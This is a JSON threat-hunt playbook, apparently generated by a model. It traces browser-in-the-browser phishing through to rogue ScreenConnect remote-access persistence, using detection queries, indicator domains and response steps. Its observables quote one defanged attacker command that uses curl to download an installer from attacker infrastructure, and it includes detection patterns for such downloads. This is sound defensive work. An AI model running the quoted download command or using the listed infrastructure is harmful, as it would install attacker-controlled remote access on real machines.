@@ -1,0 +1,645 @@
+{
+  "hunt": {
+    "meta": {
+      "tlp": "clear",
+      "hunt": {
+        "handoff": "promote-to-detection",
+        "trigger": "intel-report",
+        "methodology": "model-assisted",
+        "applicability": "campaign-specific",
+        "justification": "Browser-in-the-Browser phishing renders traditional address-bar training ineffective; identifying the subsequent RMM persistence and defense evasion tools is a necessary control to prevent unauthorized remote access."
+      },
+      "name": "BiTB Phishing to Rogue RMM Persistence",
+      "type": "investigation",
+      "labels": [
+        "hunt",
+        "attack.t1566",
+        "attack.t1059.003",
+        "attack.t1105",
+        "attack.t1543.003",
+        "attack.t1562",
+        "attack.t1090.003"
+      ],
+      "related": [
+        {
+          "hunt": "authorized-rmm-baseline-deviation",
+          "reason": "This hunt focuses on the phishing-to-persistence chain; a broader RMM inventory hunt would detect rogue tools regardless of the delivery vector.",
+          "relation": "out-of-scope-alternative"
+        }
+      ],
+      "targets": {
+        "hunter": {
+          "name": "Hunt agent",
+          "agent": true
+        },
+        "analyst": {
+          "name": "Tier-2 analyst",
+          "role": "analyst"
+        },
+        "endpoint": {
+          "name": "Endpoint telemetry (hb_ surfaces)",
+          "category": "endpoint",
+          "telemetry": [
+            "endpoint"
+          ]
+        }
+      },
+      "analysis": "This hunt uses a phased approach to connect early-stage DNS and fetch activity to later-stage persistence and evasion. It uses prevalence to baseline ScreenConnect processes across the fleet, distinguishing the unique IDs of rogue instances from corporate-wide RMM software.",
+      "coverage": [
+        {
+          "stage": "initial-access-bitb-phishing",
+          "steps": [
+            "phishing-dns-activity"
+          ],
+          "status": "covered"
+        },
+        {
+          "stage": "payload-delivery-execution",
+          "steps": [
+            "curl-payload-retrieval"
+          ],
+          "status": "covered"
+        },
+        {
+          "stage": "persistence-rogue-rmm-services",
+          "steps": [
+            "rare-screenconnect-processes"
+          ],
+          "status": "covered"
+        },
+        {
+          "stage": "defense-evasion-activity-suppression",
+          "steps": [
+            "evasion-tool-execution"
+          ],
+          "status": "covered"
+        }
+      ],
+      "scenario": {
+        "stages": [
+          {
+            "name": "BiTB Phishing and Adobe Lure",
+            "slug": "initial-access-bitb-phishing",
+            "tactic": "initial-access",
+            "techniques": [
+              "T1566"
+            ],
+            "observables": [
+              "adoube.vu",
+              "selectstructure.com.au",
+              "adobedocument.html",
+              "file.html",
+              "Fake browser window imitating get.adobe.com"
+            ]
+          },
+          {
+            "name": "RMM Installer Execution and Payload Retrieval",
+            "slug": "payload-delivery-execution",
+            "tactic": "execution",
+            "techniques": [
+              "T1059.003",
+              "T1105"
+            ],
+            "observables": [
+              "ScreenConnect.ClientSetup.exe",
+              "AdbRdBkUpsStUp.msi",
+              "patch.msi",
+              "cmd.exe /c curl -O hxxps://wir.consultingics.com/Bin/ScreenConnect.ClientSetup.msi",
+              "hosthiifran.screenconnect.com",
+              "victory.mkc1.digitaloceanspaces.com"
+            ]
+          },
+          {
+            "name": "Rogue RMM Service Persistence",
+            "slug": "persistence-rogue-rmm-services",
+            "tactic": "persistence",
+            "techniques": [
+              "T1543.003",
+              "T1090.003"
+            ],
+            "observables": [
+              "ScreenConnect Client (9c1aea531ba4c511)",
+              "ScreenConnect Client (7c1d255d0efefde6)",
+              "ScreenConnect Client (d751818fd46e5ca9)",
+              "ScreenConnect Client (c19e38a20f1ba492)",
+              "instance-uxh86b-relay.screenconnect.com",
+              "144.172.115.59",
+              "relay.goldenmelon.us",
+              "scx.illuminantgroup.net",
+              "relay.illuminantgroup.net"
+            ]
+          },
+          {
+            "name": "Defense Evasion via Tool Execution",
+            "slug": "defense-evasion-activity-suppression",
+            "tactic": "defense-evasion",
+            "techniques": [
+              "T1562"
+            ],
+            "observables": [
+              "HideCursor.exe",
+              "HideUL.exe",
+              "C:\\Users\\REDACTED\\Documents\\ScreenConnect\\Temp\\HideCursor.exe"
+            ]
+          }
+        ],
+        "summary": "Threat actors utilized a browser-in-the-browser (BiTB) technique to present a fake Adobe download page, tricking victims into installing rogue ScreenConnect clients. These clients established persistence via Windows services and deployed specialized binaries like HideCursor.exe to suppress on-screen activity and evade detection."
+      },
+      "severity": "high",
+      "rationale": "Focus on user workstations; widen to include all internet-connected endpoints if any relay domain matches are found.",
+      "guardrails": {
+        "claims": "no_unsupported",
+        "evidence": "citation_required",
+        "telemetry": "untrusted",
+        "missing_data": "not_benign"
+      },
+      "hypothesis": "An adversary has used browser-in-the-browser phishing to deceive a user into installing a rogue ScreenConnect instance, which established service-based persistence and executed evasion tools to hide its activity.",
+      "parameters": {
+        "scope_hosts": {
+          "type": "list[host]",
+          "default": [],
+          "description": "Narrow the hunt to specific hosts; leave empty for fleet-wide scanning."
+        },
+        "evasion_tools": {
+          "from": {
+            "ref": "huntress-bitb-rmm",
+            "kind": "article",
+            "observed": "2026-09-09"
+          },
+          "type": "list[path]",
+          "default": [
+            "hidecursor.exe",
+            "hideul.exe"
+          ],
+          "description": "Filenames of defense evasion tools used to suppress interactive indicators."
+        },
+        "lookback_days": {
+          "type": "number",
+          "default": "14",
+          "description": "Days of history to examine."
+        },
+        "phishing_domains": {
+          "from": {
+            "ref": "huntress-bitb-rmm",
+            "kind": "article",
+            "observed": "2026-09-09"
+          },
+          "type": "list[domain]",
+          "default": [
+            "adoube.vu",
+            "selectstructure.com.au",
+            "hosthiifran.screenconnect.com",
+            "instance-uxh86b-relay.screenconnect.com",
+            "victory.mkc1.digitaloceanspaces.com",
+            "relay.goldenmelon.us",
+            "scx.illuminantgroup.net",
+            "relay.illuminantgroup.net"
+          ],
+          "description": "Known phishing and relay domains from the report."
+        }
+      },
+      "provenance": {
+        "authors": [
+          {
+            "org": "huntbase.io",
+            "name": "Huntbase hunt generation"
+          }
+        ],
+        "generated": {
+          "by": "huntbase-hunt-generation",
+          "from": "https://www.huntress.com/blog/phishing-bitb-rmm-attacks",
+          "gates": [
+            "dry-run",
+            "lint",
+            "critic"
+          ],
+          "model": "hb_google/gemini-3-flash-preview"
+        }
+      },
+      "references": [
+        {
+          "url": "https://www.huntress.com/blog/phishing-bitb-rmm-attacks",
+          "name": "Huntress \u2014 Phishing Attacks Serve Browser-in-the-Browser Pages, Rogue RMM Persistence"
+        }
+      ],
+      "blind_spots": [
+        {
+          "id": "command-line-truncation",
+          "risk": "If the command line is truncated, the malicious domain and file extension might not be visible, causing the fetch query to miss the activity.",
+          "owner": "Endpoint Security Team",
+          "stage": "payload-delivery-execution",
+          "question": "whether the curl command line included the malicious URL",
+          "requires": "Complete process command-line logging",
+          "remediation": "Increase the command-line capture limit on the endpoint agent."
+        },
+        {
+          "id": "bitb-content-blindness",
+          "risk": "DNS logging sees the top-level domain but cannot confirm the BiTB technique itself, which happens inside the browser's rendering context.",
+          "owner": "Network Engineering",
+          "stage": "initial-access-bitb-phishing",
+          "question": "whether the BiTB HTML template was served to the browser",
+          "requires": "Proxy/HTTP payload inspection",
+          "remediation": "Enable TLS inspection on the forward proxy for unauthenticated traffic to scan for BiTB HTML patterns."
+        }
+      ]
+    },
+    "name": "BiTB Phishing to Rogue RMM Persistence",
+    "description": "This hunt follows the full lifecycle of a Browser-in-the-Browser (BiTB) attack. It begins by identifying users interacting with phishing infrastructure and subsequent payload retrieval via curl. The second phase pivots to detect the aftermath: rare or unauthorized ScreenConnect service processes and the execution of activity-hiding tools like HideCursor.exe. By weighing the early-stage access signals against the persistence evidence, the hunt distinguishes between authorized RMM software and attacker-controlled footholds."
+  },
+  "nodes": [
+    {
+      "id": "hypothesis",
+      "type": "hypothesis",
+      "label": "Hypothesis",
+      "config": {
+        "tags": [],
+        "coverage": [
+          {
+            "stage": "initial-access-bitb-phishing",
+            "steps": [
+              "phishing-dns-activity"
+            ],
+            "status": "covered"
+          },
+          {
+            "stage": "payload-delivery-execution",
+            "steps": [
+              "curl-payload-retrieval"
+            ],
+            "status": "covered"
+          },
+          {
+            "stage": "persistence-rogue-rmm-services",
+            "steps": [
+              "rare-screenconnect-processes"
+            ],
+            "status": "covered"
+          },
+          {
+            "stage": "defense-evasion-activity-suppression",
+            "steps": [
+              "evasion-tool-execution"
+            ],
+            "status": "covered"
+          }
+        ],
+        "rationale": "An adversary has used browser-in-the-browser phishing to deceive a user into installing a rogue ScreenConnect instance, which established service-based persistence and executed evasion tools to hide its activity.",
+        "blind_spots": [
+          {
+            "id": "command-line-truncation",
+            "risk": "If the command line is truncated, the malicious domain and file extension might not be visible, causing the fetch query to miss the activity.",
+            "owner": "Endpoint Security Team",
+            "stage": "payload-delivery-execution",
+            "question": "whether the curl command line included the malicious URL",
+            "requires": "Complete process command-line logging",
+            "remediation": "Increase the command-line capture limit on the endpoint agent."
+          },
+          {
+            "id": "bitb-content-blindness",
+            "risk": "DNS logging sees the top-level domain but cannot confirm the BiTB technique itself, which happens inside the browser's rendering context.",
+            "owner": "Network Engineering",
+            "stage": "initial-access-bitb-phishing",
+            "question": "whether the BiTB HTML template was served to the browser",
+            "requires": "Proxy/HTTP payload inspection",
+            "remediation": "Enable TLS inspection on the forward proxy for unauthenticated traffic to scan for BiTB HTML patterns."
+          }
+        ],
+        "scoping_notes": "Focus on user workstations; widen to include all internet-connected endpoints if any relay domain matches are found.",
+        "beyond_detection": "This hunt uses a phased approach to connect early-stage DNS and fetch activity to later-stage persistence and evasion. It uses prevalence to baseline ScreenConnect processes across the fleet, distinguishing the unique IDs of rogue instances from corporate-wide RMM software."
+      }
+    },
+    {
+      "id": "scope-screenconnect-installed",
+      "type": "query",
+      "label": "Scope ScreenConnect installations",
+      "config": {
+        "dsl": "sqlite",
+        "role": "scoping",
+        "source": "endpoint",
+        "content": "SELECT DISTINCT device_hostname, package_name, package_version, vendor_name FROM hb_software_inventory WHERE (LOWER(package_name) LIKE '%screenconnect%' OR LOWER(vendor_name) LIKE '%screenconnect%') AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0)",
+        "surface": "hb_software_inventory",
+        "description": "Identify hosts that have ScreenConnect software installed to focus the behavioral analysis.",
+        "expected_signal": "A list of hosts with any ScreenConnect software. Silence means no ScreenConnect is detected at all, which might miss portable installations."
+      },
+      "parents": [
+        {
+          "id": "hypothesis"
+        }
+      ],
+      "primitive_config": {
+        "dsl": "sqlite",
+        "role": "scoping",
+        "label": "Scope ScreenConnect installations",
+        "reads": [
+          "device_hostname",
+          "package_name",
+          "package_version",
+          "vendor_name"
+        ],
+        "source": "hb_software_inventory",
+        "target": "endpoint",
+        "content": "SELECT DISTINCT device_hostname, package_name, package_version, vendor_name FROM hb_software_inventory WHERE (LOWER(package_name) LIKE '%screenconnect%' OR LOWER(vendor_name) LIKE '%screenconnect%') AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0)",
+        "silence": "not_evidence_of_absence",
+        "expected": "A list of hosts with any ScreenConnect software. Silence means no ScreenConnect is detected at all, which might miss portable installations.",
+        "verified": "dry-run",
+        "verified_at": "2026-09-20"
+      }
+    },
+    {
+      "id": "phishing-dns-activity",
+      "type": "query",
+      "label": "DNS queries to phishing and relay infra",
+      "config": {
+        "dsl": "sqlite",
+        "role": "enrichment",
+        "source": "endpoint",
+        "content": "SELECT device_hostname, query_hostname, process_name, time FROM hb_dns_activity WHERE (instr(',' || '{{phishing_domains}}' || ',', ',' || LOWER(query_hostname) || ',') > 0) AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days')",
+        "surface": "hb_dns_activity",
+        "description": "Find resolutions to malicious domains used for the BiTB landing page and RMM relay.",
+        "expected_signal": "Hosts resolving the report's domains. A browser process name like chrome.exe or msedge.exe confirms user interaction."
+      },
+      "parents": [
+        {
+          "id": "scope-screenconnect-installed"
+        }
+      ],
+      "primitive_config": {
+        "dsl": "sqlite",
+        "role": "enrichment",
+        "label": "DNS queries to phishing and relay infra",
+        "reads": [
+          "device_hostname",
+          "process_name",
+          "query_hostname",
+          "time"
+        ],
+        "source": "hb_dns_activity",
+        "target": "endpoint",
+        "content": "SELECT device_hostname, query_hostname, process_name, time FROM hb_dns_activity WHERE (instr(',' || '{{phishing_domains}}' || ',', ',' || LOWER(query_hostname) || ',') > 0) AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days')",
+        "silence": "not_evidence_of_absence",
+        "expected": "Hosts resolving the report's domains. A browser process name like chrome.exe or msedge.exe confirms user interaction.",
+        "verified": "dry-run",
+        "verified_at": "2026-09-20"
+      }
+    },
+    {
+      "id": "curl-payload-retrieval",
+      "type": "query",
+      "label": "Payload retrieval via curl command line",
+      "config": {
+        "dsl": "sqlite",
+        "role": "detection-candidate",
+        "source": "endpoint",
+        "content": "SELECT device_hostname, process_cmd_line, parent_process_name, time FROM hb_process_activity WHERE LOWER(process_cmd_line) LIKE '%curl %' AND (LOWER(process_cmd_line) LIKE '%.msi%' OR LOWER(process_cmd_line) LIKE '%.exe%') AND time >= datetime('now', '-{{lookback_days}} days')",
+        "surface": "hb_process_activity",
+        "description": "Identify cmd.exe or powershell.exe instances using curl to download MSI or EXE files.",
+        "expected_signal": "Processes showing curl fetching installers. This is the behavior the first ScreenConnect instance used to fetch the second."
+      },
+      "parents": [
+        {
+          "id": "scope-screenconnect-installed"
+        }
+      ],
+      "primitive_config": {
+        "dsl": "sqlite",
+        "role": "detection-candidate",
+        "label": "Payload retrieval via curl command line",
+        "reads": [
+          "device_hostname",
+          "parent_process_name",
+          "process_cmd_line",
+          "time"
+        ],
+        "source": "hb_process_activity",
+        "target": "endpoint",
+        "content": "SELECT device_hostname, process_cmd_line, parent_process_name, time FROM hb_process_activity WHERE LOWER(process_cmd_line) LIKE '%curl %' AND (LOWER(process_cmd_line) LIKE '%.msi%' OR LOWER(process_cmd_line) LIKE '%.exe%') AND time >= datetime('now', '-{{lookback_days}} days')",
+        "silence": "not_evidence_of_absence",
+        "expected": "Processes showing curl fetching installers. This is the behavior the first ScreenConnect instance used to fetch the second.",
+        "verified": "dry-run",
+        "verified_at": "2026-09-20"
+      }
+    },
+    {
+      "id": "agent-early-triage",
+      "type": "analytic",
+      "label": "Triage early-stage signals",
+      "config": {
+        "cite": "required",
+        "tools": [
+          "endpoint"
+        ],
+        "context": [
+          "phishing-dns-activity",
+          "curl-payload-retrieval"
+        ],
+        "objective": "Determine if the observed DNS queries and curl fetches on each host suggest a coordinated BiTB phishing intrusion.",
+        "description": "Correlate phishing DNS activity with subsequent curl downloads to confirm the intrusion's start.",
+        "max_iterations": 3,
+        "expected_signal": "A per-host verdict on whether the initial access signals are malicious.",
+        "success_criteria": "A verdict of malicious | suspicious | benign per host."
+      },
+      "parents": [
+        {
+          "id": "phishing-dns-activity",
+          "kind": "merge"
+        },
+        {
+          "id": "curl-payload-retrieval",
+          "kind": "merge"
+        }
+      ]
+    },
+    {
+      "id": "rare-screenconnect-processes",
+      "type": "query",
+      "label": "Prevalence of ScreenConnect processes",
+      "config": {
+        "dsl": "sqlite",
+        "role": "baseline",
+        "source": "endpoint",
+        "content": "SELECT process_name, COUNT(DISTINCT device_hostname) AS hosts, MIN(time) AS first_seen FROM hb_process_activity WHERE LOWER(process_name) LIKE '%screenconnect%' AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY process_name HAVING hosts <= 3",
+        "surface": "hb_process_activity",
+        "description": "Stack-count ScreenConnect processes to find rare or unauthorized instances that do not match the fleet baseline.",
+        "expected_signal": "Rare ScreenConnect process names, which often include unique ID strings for rogue instances. Corporate RMM should show high counts."
+      },
+      "parents": [
+        {
+          "id": "agent-early-triage"
+        }
+      ],
+      "primitive_config": {
+        "dsl": "sqlite",
+        "role": "baseline",
+        "label": "Prevalence of ScreenConnect processes",
+        "reads": [
+          "device_hostname",
+          "process_name",
+          "time"
+        ],
+        "source": "hb_process_activity",
+        "target": "endpoint",
+        "content": "SELECT process_name, COUNT(DISTINCT device_hostname) AS hosts, MIN(time) AS first_seen FROM hb_process_activity WHERE LOWER(process_name) LIKE '%screenconnect%' AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY process_name HAVING hosts <= 3",
+        "silence": "not_evidence_of_absence",
+        "baseline": {
+          "window": "{{lookback_days}}d",
+          "compare": "first_seen"
+        },
+        "expected": "Rare ScreenConnect process names, which often include unique ID strings for rogue instances. Corporate RMM should show high counts.",
+        "verified": "dry-run",
+        "prevalence": {
+          "by": "device_hostname",
+          "key": [
+            "process_name"
+          ],
+          "rare_below": 3
+        },
+        "verified_at": "2026-09-20"
+      }
+    },
+    {
+      "id": "evasion-tool-execution",
+      "type": "query",
+      "label": "Evasion tool detection",
+      "config": {
+        "dsl": "sqlite",
+        "role": "enrichment",
+        "source": "endpoint",
+        "content": "SELECT device_hostname, process_name, process_path, process_cmd_line, time FROM hb_process_activity WHERE (instr(',' || '{{evasion_tools}}' || ',', ',' || LOWER(process_name) || ',') > 0 OR LOWER(process_path) LIKE '%\\screenconnect\\temp%') AND time >= datetime('now', '-{{lookback_days}} days')",
+        "surface": "hb_process_activity",
+        "description": "Identify execution of HideCursor.exe or HideUL.exe, or any binaries launching from ScreenConnect temp folders.",
+        "expected_signal": "Process events for the identified evasion binaries or activity in the ScreenConnect temp folder."
+      },
+      "parents": [
+        {
+          "id": "agent-early-triage"
+        }
+      ],
+      "primitive_config": {
+        "dsl": "sqlite",
+        "role": "enrichment",
+        "label": "Evasion tool detection",
+        "reads": [
+          "device_hostname",
+          "process_cmd_line",
+          "process_name",
+          "process_path",
+          "time"
+        ],
+        "source": "hb_process_activity",
+        "target": "endpoint",
+        "content": "SELECT device_hostname, process_name, process_path, process_cmd_line, time FROM hb_process_activity WHERE (instr(',' || '{{evasion_tools}}' || ',', ',' || LOWER(process_name) || ',') > 0 OR LOWER(process_path) LIKE '%\\screenconnect\\temp%') AND time >= datetime('now', '-{{lookback_days}} days')",
+        "silence": "not_evidence_of_absence",
+        "expected": "Process events for the identified evasion binaries or activity in the ScreenConnect temp folder.",
+        "verified": "dry-run",
+        "verified_at": "2026-09-20"
+      }
+    },
+    {
+      "id": "agent-final-read",
+      "type": "analytic",
+      "label": "Final intrusion synthesis",
+      "config": {
+        "cite": "required",
+        "tools": [
+          "endpoint"
+        ],
+        "context": [
+          "agent-early-triage",
+          "rare-screenconnect-processes",
+          "evasion-tool-execution"
+        ],
+        "objective": "Weigh the early access signals from agent-early-triage against the presence of rare ScreenConnect processes and evasion tools to confirm an active intrusion.",
+        "description": "Synthesize early access signals and follow-on persistence/evasion evidence to confirm the full attack chain.",
+        "max_iterations": 5,
+        "expected_signal": "A comprehensive verdict for each host involved.",
+        "success_criteria": "A final verdict of malicious | suspicious | benign per host, citing specific rows from all stages."
+      },
+      "parents": [
+        {
+          "id": "rare-screenconnect-processes",
+          "kind": "merge"
+        },
+        {
+          "id": "evasion-tool-execution",
+          "kind": "merge"
+        }
+      ]
+    },
+    {
+      "id": "decision-route",
+      "type": "checkpoint",
+      "label": "Decision on intrusion",
+      "config": {
+        "fuzzy": true,
+        "judge": "hunter",
+        "question": "the agent-final-read verdict is malicious for at least one host",
+        "condition": "the agent-final-read verdict is malicious for at least one host",
+        "blind_spot": "command-line-truncation",
+        "confidence": "high",
+        "description": "Route the hunt based on the agent's confidence in a malicious intrusion.",
+        "checkpoint_type": "mandatory"
+      },
+      "parents": [
+        {
+          "id": "agent-final-read"
+        }
+      ]
+    },
+    {
+      "id": "isolate-compromised-host",
+      "type": "action",
+      "label": "Isolate compromised host",
+      "config": {
+        "target": "endpoint",
+        "description": "Prevent further attacker activity by containing the affected endpoint.",
+        "instructions": "Isolate the host via the EDR. Following isolation, collect the ScreenConnect service binaries and the evasion tools from the Documents\\ScreenConnect\\Temp directory.",
+        "action_approval": "required"
+      },
+      "parents": [
+        {
+          "id": "decision-route",
+          "branch": "on_supports"
+        }
+      ]
+    },
+    {
+      "id": "analyst-validation",
+      "type": "task",
+      "label": "Manual analyst validation",
+      "config": {
+        "assignee": "analyst",
+        "description": "Verify the findings and investigate the initial phishing delivery channel.",
+        "instructions": "Check hb_http_activity for request logs to the adoube.vu or selectstructure.com.au domains. Verify if the ScreenConnect binaries are signed by an expected publisher and investigate the user's recent email activity for RingCentral or Gmail lures."
+      },
+      "parents": [
+        {
+          "id": "decision-route",
+          "branch": "default"
+        },
+        {
+          "id": "decision-route",
+          "branch": "on_unavailable"
+        },
+        {
+          "id": "isolate-compromised-host"
+        }
+      ]
+    },
+    {
+      "id": "close-out-hunt",
+      "type": "task",
+      "label": "Close out hunt",
+      "config": {
+        "assignee": "analyst",
+        "description": "Document findings and archive the hunt when no malicious activity is confirmed.",
+        "instructions": "Record the hosts examined and note any legitimate RMM usage that should be added to the baseline for future hunts."
+      },
+      "parents": [
+        {
+          "id": "decision-route",
+          "branch": "on_refutes"
+        }
+      ]
+    }
+  ]
+}
